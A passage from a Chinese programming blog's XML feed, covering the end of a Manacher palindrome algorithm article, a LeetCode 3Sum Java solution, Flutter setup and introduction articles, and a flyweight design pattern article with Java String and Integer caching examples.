&#123;</span><br><span class="line">                p[i]++;</span><br><span class="line">                left--;</span><br><span class="line">                right++;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 根据 maxRight 的定义，它是遍历过的 i 的 i + p[i] 的最大者</span><br><span class="line">            &#x2F;&#x2F; 如果 maxRight 的值越大，进入上面 i &lt; maxRight 的判断的可能性就越大，这样就可以重复利用之前判断过的回文信息了</span><br><span class="line">            if (i + p[i] &gt; maxRight) &#123;</span><br><span class="line">                &#x2F;&#x2F; maxRight 和 center 需要同时更新</span><br><span class="line">                maxRight &#x3D; i + p[i];</span><br><span class="line">                center &#x3D; i;</span><br><span class="line">            &#125;</span><br><span class="line">            if (p[i] &gt; maxLen) &#123;</span><br><span class="line">                &#x2F;&#x2F; 记录最长回文子串的长度和相应它在原始字符串中的起点</span><br><span class="line">                maxLen &#x3D; p[i];</span><br><span class="line">                start &#x3D; (i - maxLen) &#x2F; 2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return s.substring(start, start + maxLen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 创建预处理字符串</span><br><span class="line">     *</span><br><span class="line">     * @param s      原始字符串</span><br><span class="line">     * @param divide 分隔字符</span><br><span class="line">     * @return 使用分隔字符处理以后得到的字符串</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private String addBoundaries(String s, char divide) &#123;</span><br><span class="line">        int len &#x3D; s.length();</span><br><span class="line">        if (len &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (s.indexOf(divide) !&#x3D; -1) &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;参数错误，您传递的分割字符，在输入字符串中存在！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder stringBuilder &#x3D; new StringBuilder();</span><br><span class="line">        for (int i &#x3D; 0; i &lt; len; i++) &#123;</span><br><span class="line">            stringBuilder.append(divide);</span><br><span class="line">            stringBuilder.append(s.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        stringBuilder.append(divide);</span><br><span class="line">        return stringBuilder.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>复杂度分析：</strong></p><ul><li>时间复杂度：O(N)，由于 Manacher 算法只有在遇到还未匹配的位置时才进行匹配，已经匹配过的位置不再匹配，因此对于字符串 <code>S</code> 的每一个位置，都只进行一次匹配，算法的复杂度为O(N)。</li><li>空间复杂度：O(N) 。</li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>Manacher 算法我个人觉得没有必要记住，如果真有遇到，查资料就可以了。“最长回文子串”问题最通用的做法是动态规划，它的时间复杂度为O(N*N)，大家可以自己动手试试，或者查阅相关资料，把它做出来。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode-3SUM(三数相加等于0)</title>
      <link href="/2021/07/02/leetcode-3SUM-%E4%B8%89%E6%95%B0%E7%9B%B8%E5%8A%A0%E7%AD%89%E4%BA%8E0/"/>
      <url>/2021/07/02/leetcode-3SUM-%E4%B8%89%E6%95%B0%E7%9B%B8%E5%8A%A0%E7%AD%89%E4%BA%8E0/</url>
      
        <content type="html"><![CDATA[<p>转自<a href="https://blog.csdn.net/u013374645/article/details/81054778">leetcode-3SUM(三数相加等于0)</a><br>Given an array nums of n integers, are there elements a, b, c in nums such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.</p><p>Note:</p><p>The solution set must not contain duplicate triplets.</p><p>Example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Given array nums &#x3D; [-1, 0, 1, 2, -1, -4],</span><br><span class="line"> </span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [-1, 0, 1],</span><br><span class="line">  [-1, -1, 2]]</span><br></pre></td></tr></table></figure><p>Java 程序如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import java.util.Arrays;</span><br><span class="line">import java.util.LinkedList;</span><br><span class="line">import java.util.List;</span><br><span class="line"> </span><br><span class="line">public class ThreeSum &#123;</span><br><span class="line">    public static List&lt;List&lt;Integer&gt;&gt; threeSum(int[] nums) &#123;</span><br><span class="line">        &#x2F;&#x2F;先将数组进行升序排序</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        LinkedList result &#x3D; new LinkedList();</span><br><span class="line">        &#x2F;&#x2F;先选择一个数，然后在后面的挑选两个元素求和，因此i &lt; num.length - 2</span><br><span class="line">        for(int i &#x3D; 0; i &lt; nums.length - 2; i++)&#123;</span><br><span class="line">            &#x2F;&#x2F;定义两个指针</span><br><span class="line">            int lo,hi,sum;</span><br><span class="line">            &#x2F;&#x2F;当i&#x3D;0时，意味着第一次遍历，当i&gt;0时，若num[i]&#x3D;&#x3D;num[i-1]，则可以跳过该元素（因为数组是有序的）</span><br><span class="line">            if(i &#x3D;&#x3D; 0 || nums[i] !&#x3D; nums[i-1])&#123;</span><br><span class="line">                &#x2F;&#x2F;低位指针从i+1开始，避免重复元祖</span><br><span class="line">                lo &#x3D; i+1;</span><br><span class="line">                &#x2F;&#x2F;高位指针从最后一个元素开始</span><br><span class="line">                hi &#x3D; nums.length-1;</span><br><span class="line">                while (lo &lt; hi)&#123;</span><br><span class="line">                    sum &#x3D; 0 - nums[i];</span><br><span class="line">                    if(sum &#x3D;&#x3D; nums[lo]+nums[hi])&#123;</span><br><span class="line">                        result.add(Arrays.asList(nums[i],nums[lo],nums[hi]));</span><br><span class="line">                        &#x2F;&#x2F;若当前指针元素与移动方向上的下一个指针元素相同，则跳过（此处要做++（--）操作才能跳过）</span><br><span class="line">                        while (lo&lt;hi &amp;&amp; nums[lo] &#x3D;&#x3D; nums[lo+1]) &#123;</span><br><span class="line">                            lo++;</span><br><span class="line">                        &#125;</span><br><span class="line">                        while (lo&lt;hi &amp;&amp; nums[hi] &#x3D;&#x3D; nums[hi-1]) &#123;</span><br><span class="line">                            hi--;</span><br><span class="line">                        &#125;</span><br><span class="line">                        lo++;</span><br><span class="line">                        hi--;</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#x2F;&#x2F;若两数之和小于0，则lo++；大于0则hi--</span><br><span class="line">                    else if(nums[lo]+nums[hi] &lt; sum) lo++;</span><br><span class="line">                    else hi--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int[] nums&#x3D; new int[]&#123;-4,-2,-2,-2,0,1,2,2,2,3,3,4,4,6,6&#125;;</span><br><span class="line">        System.out.println(Arrays.deepToString(threeSum(nums).toArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创建一个flutter 程序</title>
      <link href="/2021/02/20/%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAflutter-%E7%A8%8B%E5%BA%8F/"/>
      <url>/2021/02/20/%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAflutter-%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>[参考]<a href="https://flutterchina.club/tutorials/">Flutter教程</a></p><h1 id="创建新应用"><a href="#创建新应用" class="headerlink" title="创建新应用"></a>创建新应用</h1><p>本文用的开发工具是Android Studio。关于Flutter开发工具的安装参考官方链接 <a href="https://flutterchina.club/tutorials/">Flutter教程</a>。</p><ol><li><p>创建project， 如图所示，在Android Studio 的启动界面选择<strong>Start a new Flutter project</strong>, 或者在Android的菜单栏里面选择File -&gt; New -&gt; New Flutter Project<br><img src="https://upload-images.jianshu.io/upload_images/15531792-0727ba1f360925f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p></li><li><p>选择Flutter Application， 点击next。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-4bb4bfb3918adbd4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p></li><li><p>输入project的名字，这里的名字是my_first_flutter_app, 选择sdk的路径和project的路径，点击next<br><img src="https://upload-images.jianshu.io/upload_images/15531792-272b0551cba9be3e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p></li></ol><ol start="4"><li><p>输入package的名字，点击finish。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b8e355ed13850d45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p></li><li><p>创建出来的project 包含以下文件：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-7ea1869550ebda05.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p></li></ol><p>Android studio 界面，程序代码位于lib/main.dart，已经有一个demo 代码了，可以直接选择device运行。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-0405b25ffd81b832.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h1><ol><li>定位到Android Studio 工具栏:<br>官方图片： <img src="https://upload-images.jianshu.io/upload_images/15531792-65cdcf9f741366eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>自己的图片：<img src="https://upload-images.jianshu.io/upload_images/15531792-cd7986a1fefafb86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ol><ol start="2"><li>在 target selector 中, 选择一个运行该应用的Android设备. 如果没有列出可用，请选择 Tools&gt;Android&gt;AVD Manager 并在那里创建一个</li><li>在工具栏中点击 Run图标, 或者调用菜单项 Run &gt; Run.</li><li>如果一切正常, 您应该在您的设备或模拟器上会看到启动的应用程序:</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/15531792-50985f02208806e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="体验热重载"><a href="#体验热重载" class="headerlink" title="体验热重载"></a>体验热重载</h1><p>Flutter 可以通过 热重载（hot reload） 实现快速的开发周期，热重载就是无需重启应用程序就能实时加载修改后的代码，并且不会丢失状态（译者语:如果是一个web开发者，那么可以认为这和webpack的热重载是一样的）。简单的对代码进行更改，然后告诉IDE或命令行工具你需要重新加载（点击reload按钮），你就会在你的设备或模拟器上看到更改。</p><ol><li>将字符串<br>‘You have pushed the button this many times:’ 更改为<br>‘You have clicked the button this many times:’</li><li>不要按“Stop”按钮; 让您的应用继续运行。</li><li>要查看您的更改, 只需调用 Save All (cmd-s / ctrl-s), 或点击 热重载按钮 (带有闪电⚡️图标的按钮).</li></ol><p>你就会立即看到更新后的字符串。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Flutter Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flutter 简介</title>
      <link href="/2021/02/20/Flutter-%E7%AE%80%E4%BB%8B/"/>
      <url>/2021/02/20/Flutter-%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.jianshu.com/p/ec59f877ddd8">Flutter简介</a></p><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>随着移动开发技术的日渐成熟，一些厂商开始考虑跨平台技术的解决方案，从早期的Cordova、Xamarin，再到后来的React Native和Weex等等，可谓是百家齐放，每种框架都有各自的优缺点，但目标都是一致的，就是提升应用的开发效率，降低研发成本，一套代码运行多个平台。这些框架除了Xamarin外都是采用Web端技术开发移动端应用，但提供比Web更好的用户体验。</p><p>以上框架中Cordova其实是一个Webapp框架，提供了针对iOS、Android、WP、BlackBerry等不同系统最常用的Native API调用能力，其本质还是由webkit做UI渲染，因此其性能和原生相比还有很大差距；而Xamarin笔者了解不多，又是个收费的项目，不再做扩展，有兴趣的可自行了解；React Native和Weex原理基本一样，都是基于js的开发框架，React Native基于React.js，Weex基于Vue.js，其本质都是通过虚拟DOM驱动原生组件的渲染，因此性能和体验比较接近原生，然而其需要通过桥接器来驱动原生渲染的过程，导致其在性能上与原生还是有一定差距。基于以上框架的缺点，Flutter框架应运而生。</p><p>Flutter是Google在2015年推出的移动UI框架，可快速在iOS和Android上构建高质量的原生用户界面。</p><p>Flutter第一次亮相于2015年5月Dart开发者峰会上，初始名字叫做“Sky”，后更名为Flutter，Flutter使用Dart语言开发，Dart是Google于2011年推出的新的计算机编程语言。</p><h3 id="Flutter-特点"><a href="#Flutter-特点" class="headerlink" title="Flutter 特点"></a>Flutter 特点</h3><ul><li><p>快速开发<br>由于Flutter选用了Dart作为其开发语言，Dart既可以是AOT（Ahead Of Time）编译，也可以是JIT（Just In Time）编译，其JIT编译的特性使Flutter在开发阶段可以达到亚秒级有状态热重载，从而大大提升了开发效率。</p></li><li><p>性能优越<br>使用自带的高性能渲染引擎（Skia）进行自绘，渲染速度和用户体验堪比原生。</p></li><li><p>富有表现力的精美UI<br>Flutter内置众多精美的Material Design和Cupertino（iOS风格）小部件，开发者可快速构建精美的用户界面，以提供更好的用户体验。</p></li></ul><h4 id="Flutter-框架"><a href="#Flutter-框架" class="headerlink" title="Flutter 框架"></a>Flutter 框架</h4><p><img src="https://upload-images.jianshu.io/upload_images/14594750-75a45d1b52ca12a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="flutter 框架图"></p><p>如上图所示为Flutter官方给出的系统架构图，可以看出Flutter框架分为三层：Framework层、Engine层和Embedder层。</p><ul><li><p>Framework层：由Dart来实现，包含众多安卓Material风格和iOS Cupertino风格的Widgets小部件，还有渲染、动画、绘图和手势等。Framework包含日常开发所需要的大量API，普通应用开发熟悉这些API的使用基本OK了，不过很多特殊场景的控件需要自己根据实际情况进行自定义。Framework层的源码地址：<a href="https://github.com/flutter/flutter/tree/master/packages/flutter/lib">https://github.com/flutter/flutter/tree/master/packages/flutter/lib</a></p></li><li><p>Engine层：由C/C++实现，是Flutter的核心引擎，主要包括Skia图形引擎、Dart运行时环境Dart VM、Text文本渲染引擎等；如果想深入了解Flutter原理，建议阅读该层的源代码。源代码地址：<a href="https://github.com/flutter/engine">https://github.com/flutter/engine</a></p></li><li><p>Embedder层：主要处理一些平台相关的操作，如渲染Surface设置、本地插件、打包、线程设置等。</p></li></ul><h4 id="Flutter-原理"><a href="#Flutter-原理" class="headerlink" title="Flutter 原理"></a>Flutter 原理</h4><p>无论是iOS还是安卓都是提供一个平台的View给Flutter层，页面内容渲染交由Flutter层自身来完成，所以其相对React Native等框架性能更好。Flutter中图形渲染流程：<br><img src="https://upload-images.jianshu.io/upload_images/14594750-e47084cd993e6339.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="Flutter原理"></p><p>大致流程如下：</p><ol><li>GPU的Vsync信号同步到UI线程</li><li>UI线程使用Dart来构建抽象的视图结构</li><li>视图结构在GPU线程中进行图层合成</li><li>合成后的视图数据提供给Skia图形引擎处理成GPU数据</li><li>数据再通过OpenGL或Vulkan提供给GPU进行渲染</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Flutter Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>享元模式</title>
      <link href="/2021/02/14/%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/02/14/%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>[转自]<a href="https://juejin.cn/post/6844903683860217864">设计模式 | 享元模式及典型应用</a></p><h1 id="什么是享元模式"><a href="#什么是享元模式" class="headerlink" title="什么是享元模式"></a>什么是享元模式</h1><p>运用共享技术有效地支持大量细粒度对象的复用。系统只使用少量的对象，而这些对象都很相似，状态变化很小，可以实现对象的多次复用。由于享元模式要求能够共享的对象必须是细粒度对象，因此它又称为轻量级模式，它是一种对象结构型模式。享元模式结构较为复杂，一般结合工厂模式一起使用。</p><p>享元模式FlyWeight，运用共享技术有效的支持大量细粒度的对象。</p><p>典型的享元模式的例子为文书处理器中以图形结构来表示字符。一个做法是，每个字形有其字型外观, 字模 metrics，和其它格式资讯，但这会使每个字符就耗用上千字节。取而代之的是，每个字符参照到一个共享字形物件，此物件会被其它有共同特质的字符所分享；只有每个字符（文件中或页面中）的位置才需要另外储存。</p><p><strong>角色</strong></p><ul><li>Flyweight（抽象享元类）：通常是一个接口或抽象类，在抽象享元类中声明了具体享元类公共的方法，这些方法可以向外界提供享元对象的内部数据（内部状态），同时也可以通过这些方法来设置外部数据（外部状态）。</li><li>ConcreteFlyweight（具体享元类）：它实现了抽象享元类，其实例称为享元对象；在具体享元类中为内部状态提供了存储空间。通常我们可以结合单例模式来设计具体享元类，为每一个具体享元类提供唯一的享元对象。</li><li>UnsharedConcreteFlyweight（非共享具体享元类）：并不是所有的抽象享元类的子类都需要被共享，不能被共享的子类可设计为非共享具体享元类；当需要一个非共享具体享元类的对象时可以直接通过实例化创建。</li><li>FlyweightFactory（享元工厂类）：享元工厂类用于创建并管理享元对象，它针对抽象享元类编程，将各种类型的具体享元对象存储在一个享元池中，享元池一般设计为一个存储“键值对”的集合（也可以是其他类型的集合），可以结合工厂模式进行设计；当用户请求一个具体享元对象时，享元工厂提供一个存储在享元池中已创建的实例或者创建一个新的实例（如果不存在的话），返回新创建的实例并将其存储在享元池中。</li></ul><p><code>单纯享元模式：在单纯享元模式中，所有的具体享元类都是可以共享的，不存在非共享具体享元类。 复合享元模式：将一些单纯享元对象使用组合模式加以组合，还可以形成复合享元对象，这样的复合享元对象本身不能共享，但是它们可以分解成单纯享元对象，而后者则可以共享</code></p><p>在享元模式中引入了享元工厂类，享元工厂类的作用在于提供一个用于存储享元对象的享元池，当用户需要对象时，首先从享元池中获取，如果享元池中不存在，则创建一个新的享元对象返回给用户，并在享元池中保存该新增对象。<br>典型的享元工厂类的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class FlyweightFactory &#123;</span><br><span class="line">    &#x2F;&#x2F;定义一个HashMap用于存储享元对象，实现享元池</span><br><span class="line">    private HashMap flyweights &#x3D; newHashMap();</span><br><span class="line">    public Flyweight getFlyweight(String key)&#123;</span><br><span class="line">        &#x2F;&#x2F;如果对象存在，则直接从享元池获取</span><br><span class="line">        if(flyweights.containsKey(key))&#123;</span><br><span class="line">            return(Flyweight)flyweights.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;如果对象不存在，先创建一个新的对象添加到享元池中，然后返回</span><br><span class="line">        else &#123;</span><br><span class="line">            Flyweight fw &#x3D; newConcreteFlyweight();</span><br><span class="line">            flyweights.put(key,fw);</span><br><span class="line">            return fw;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>享元类的设计是享元模式的要点之一，在享元类中要将内部状态和外部状态分开处理，通常将内部状态作为享元类的成员变量，而外部状态通过注入的方式添加到享元类中。<br>典型的享元类代码如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Flyweight &#123;</span><br><span class="line">    &#x2F;&#x2F;内部状态intrinsicState作为成员变量，同一个享元对象其内部状态是一致的</span><br><span class="line">    private String intrinsicState;</span><br><span class="line">    public Flyweight(String intrinsicState) &#123;</span><br><span class="line">        this.intrinsicState&#x3D;intrinsicState;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;外部状态extrinsicState在使用时由外部设置，不保存在享元对象中，即使是同一个对象</span><br><span class="line">    public void operation(String extrinsicState) &#123;</span><br><span class="line">        &#x2F;&#x2F;......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>享元模式一般的类图如下<br><img src="https://upload-images.jianshu.io/upload_images/15531792-aed98d9525a9b524.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>具体示例请看原文： <a href="https://juejin.cn/post/6844903683860217864">设计模式 | 享元模式及典型应用</a></p><h4 id="享元模式总结"><a href="#享元模式总结" class="headerlink" title="享元模式总结"></a>享元模式总结</h4><p><strong>享元模式的主要优点如下：</strong></p><p>可以极大减少内存中对象的数量，使得相同或相似对象在内存中只保存一份，从而可以节约系统资源，提高系统性能。<br>享元模式的外部状态相对独立，而且不会影响其内部状态，从而使得享元对象可以在不同的环境中被共享。</p><p><strong>享元模式的主要缺点如下：</strong></p><p>享元模式使得系统变得复杂，需要分离出内部状态和外部状态，这使得程序的逻辑复杂化。<br>为了使对象可以共享，享元模式需要将享元对象的部分状态外部化，而读取外部状态将使得运行时间变长。</p><p><strong>适用场景：</strong></p><p>一个系统有大量相同或者相似的对象，造成内存的大量耗费。<br>对象的大部分状态都可以外部化，可以将这些外部状态传入对象中。<br>在使用享元模式时需要维护一个存储享元对象的享元池，而这需要耗费一定的系统资源，因此，应当在需要多次重复使用享元对象时才值得使用享元模式。</p><h4 id="源码分析享元模式的典型应用"><a href="#源码分析享元模式的典型应用" class="headerlink" title="源码分析享元模式的典型应用"></a>源码分析享元模式的典型应用</h4><p><strong>String中的享元模式</strong><br>Java中将String类定义为final（不可改变的），JVM中字符串一般保存在字符串常量池中，java会确保一个字符串在常量池中只有一个拷贝，这个字符串常量池在JDK6.0以前是位于常量池中，位于永久代，而在JDK7.0中，JVM将其从永久代拿出来放置于堆中。<br>我们做一个测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String s1 &#x3D; &quot;hello&quot;;</span><br><span class="line">        String s2 &#x3D; &quot;hello&quot;;</span><br><span class="line">        String s3 &#x3D; &quot;he&quot; + &quot;llo&quot;;</span><br><span class="line">        String s4 &#x3D; &quot;hel&quot; + new String(&quot;lo&quot;);</span><br><span class="line">        String s5 &#x3D; new String(&quot;hello&quot;);</span><br><span class="line">        String s6 &#x3D; s5.intern();</span><br><span class="line">        String s7 &#x3D; &quot;h&quot;;</span><br><span class="line">        String s8 &#x3D; &quot;ello&quot;;</span><br><span class="line">        String s9 &#x3D; s7 + s8;</span><br><span class="line">        System.out.println(s1&#x3D;&#x3D;s2);&#x2F;&#x2F;true</span><br><span class="line">        System.out.println(s1&#x3D;&#x3D;s3);&#x2F;&#x2F;true</span><br><span class="line">        System.out.println(s1&#x3D;&#x3D;s4);&#x2F;&#x2F;false</span><br><span class="line">        System.out.println(s1&#x3D;&#x3D;s9);&#x2F;&#x2F;false</span><br><span class="line">        System.out.println(s4&#x3D;&#x3D;s5);&#x2F;&#x2F;false</span><br><span class="line">        System.out.println(s1&#x3D;&#x3D;s6);&#x2F;&#x2F;true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>String类的final修饰的，以字面量的形式创建String变量时，jvm会在编译期间就把该字面量hello放到字符串常量池中，由Java程序启动的时候就已经加载到内存中了。这个字符串常量池的特点就是有且只有一份相同的字面量，如果有其它相同的字面量，jvm则返回这个字面量的引用，如果没有相同的字面量，则在字符串常量池创建这个字面量并返回它的引用。<br>由于s2指向的字面量hello在常量池中已经存在了（s1先于s2），于是jvm就返回这个字面量绑定的引用，所以s1==s2。<br>s3中字面量的拼接其实就是hello，jvm在编译期间就已经对它进行优化，所以s1和s3也是相等的。<br>s4中的new String(“lo”)生成了两个对象，lo，new String(“lo”)，lo存在字符串常量池，new String(“lo”)存在堆中，String s4 = “hel” + new String(“lo”)实质上是两个对象的相加，编译器不会进行优化，相加的结果存在堆中，而s1存在字符串常量池中，当然不相等。s1==s9的原理一样。<br>s4==s5两个相加的结果都在堆中，不用说，肯定不相等。<br>s1==s6中，s5.intern()方法能使一个位于堆中的字符串在运行期间动态地加入到字符串常量池中（字符串常量池的内容是程序启动的时候就已经加载好了），如果字符串常量池中有该对象对应的字面量，则返回该字面量在字符串常量池中的引用，否则，创建复制一份该字面量到字符串常量池并返回它的引用。因此s1==s6输出true。</p><p><strong>Integer 中的享元模式</strong><br>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    Integer i1 &#x3D; 12 ;</span><br><span class="line">    Integer i2 &#x3D; 12 ;</span><br><span class="line">    System.out.println(i1 &#x3D;&#x3D; i2);</span><br><span class="line"></span><br><span class="line">    Integer b1 &#x3D; 128 ;</span><br><span class="line">    Integer b2 &#x3D; 128 ;</span><br><span class="line">    System.out.println(b1 &#x3D;&#x3D; b2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">true</span><br><span class="line">false</span><br></pre></td></tr></table></figure><p>为什么第一个是true，第二个是false？ 反编译后可以发现 Integer b1 = 128; 实际变成了 Integer b1 = Integer.valueOf(128);，所以我们来看 Integer 中的 valueOf 方法的实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public final class Integer extends Number implements Comparable&lt;Integer&gt; &#123;</span><br><span class="line">    public static Integer valueOf(int var0) &#123;</span><br><span class="line">        return var0 &gt;&#x3D; -128 &amp;&amp; var0 &lt;&#x3D; Integer.IntegerCache.high ? Integer.IntegerCache.cache[var0 + 128] : new Integer(var0);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;...省略...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>IntegerCache 缓存类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;是Integer内部的私有静态类,里面的cache[]就是jdk事先缓存的Integer。</span><br><span class="line">private static class IntegerCache &#123;</span><br><span class="line">    static final int low &#x3D; -128;&#x2F;&#x2F;区间的最低值</span><br><span class="line">    static final int high;&#x2F;&#x2F;区间的最高值，后面默认赋值为127，也可以用户手动设置虚拟机参数</span><br><span class="line"> 